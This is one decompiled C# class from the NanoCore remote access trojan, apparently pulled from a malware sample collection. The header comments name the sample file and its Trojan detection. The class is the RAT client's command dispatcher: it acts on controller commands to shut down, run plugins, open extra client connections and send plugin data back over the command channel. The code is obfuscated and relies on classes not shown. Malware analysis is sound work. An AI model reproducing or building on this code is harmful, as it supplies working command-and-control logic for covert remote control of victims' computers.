// Decompiled with JetBrains decompiler
// Type: Class20
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using Microsoft.VisualBasic.CompilerServices;
using System;

[StandardModule]
internal sealed class Class20
{
  public static void smethod_0(GStruct2 gstruct2_0)
  {
    switch (gstruct2_0.byte_1)
    {
      case 1:
        Class20.smethod_1();
        break;
      case 2:
        Class20.smethod_3(gstruct2_0.object_0);
        break;
      case 4:
        Class20.smethod_2(gstruct2_0.guid_0, gstruct2_0.object_0);
        break;
      case 6:
        Class20.smethod_4();
        break;
      case 7:
        Class20.smethod_5(gstruct2_0.object_0);
        break;
    }
  }

  public static void smethod_1() => Class8.smethod_75(true);

  public static void smethod_2(Guid guid_0, object[] object_0)
  {
    GClass2 gclass2 = Class23.smethod_1(guid_0);
    if (gclass2 == null)
      throw new Exception(string.Format("No instance of plugin '{0}' could be found.", (object) guid_0));
    try
    {
      gclass2.gclass3_0.method_7((string) null, object_0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class8.smethod_85(gclass2.gclass3_0, exception_0, "ReadPacket []");
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_3(object[] object_0)
  {
    string str = (string) object_0[0];
    Guid guid_1 = (Guid) object_0[1];
    Guid guid_0 = (Guid) object_0[2];
    if (Class8.dictionary_2.ContainsKey(str))
      return;
    Client client = Class8.smethod_39();
    Class8.dictionary_2.Add(str, client);
    GClass3 gclass3_1 = (GClass3) null;
    if (!(guid_0 == Guid.Empty))
      gclass3_1 = Class23.smethod_1(guid_0).gclass3_0;
    client.method_31(new GClass0());
    client.method_30().method_0(guid_1, str, gclass3_1);
    client.method_4(new Client.GDelegate4(Class8.smethod_78));
    client.method_6(new Client.GDelegate2(Class8.smethod_77));
    client.method_2(new Client.GDelegate7(Class8.smethod_79));
    client.method_14(new Client.GDelegate9(Class8.smethod_81));
    client.method_44(Class8.smethod_65(), Class24.smethod_6());
  }

  public static void smethod_4() => Class8.dateTime_2 = DateTime.Now;

  public static void smethod_5(object[] object_0)
  {
    string string_4 = (string) object_0[0];
    if ((bool) object_0[1])
    {
      try
      {
        string string_0 = Class8.smethod_61(string_4);
        if (!string.IsNullOrEmpty(string_0))
          Class20.smethod_8(string_0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception_0 = ex;
        Class8.smethod_62(string_4);
        Class8.smethod_86(exception_0, "HandleBaseCommandExceptionHash");
        ProjectData.ClearProjectError();
      }
    }
    if (Class8.queue_0.Count == 0)
      return;
    Class20.smethod_7(Class8.queue_0.Dequeue());
  }

  public static void smethod_6(Guid guid_0, string string_0, string string_1, Version version_0) => Class8.smethod_88(Class8.client_0, true, CommandType.BaseCommand, (byte) 0, new object[4]
  {
    (object) guid_0,
    (object) string_0,
    (object) string_1,
    (object) version_0.ToString()
  });

  public static void smethod_7(string string_0) => Class8.smethod_88(Class8.client_0, true, CommandType.BaseCommand, (byte) 7, new object[1]
  {
    (object) string_0
  });

  public static void smethod_8(string string_0) => Class8.smethod_88(Class8.client_0, true, CommandType.BaseCommand, (byte) 8, new object[1]
  {
    (object) string_0
  });

  public static void smethod_9() => Class8.smethod_88(Class8.client_0, true, CommandType.BaseCommand, (byte) 6, new object[0]);
}
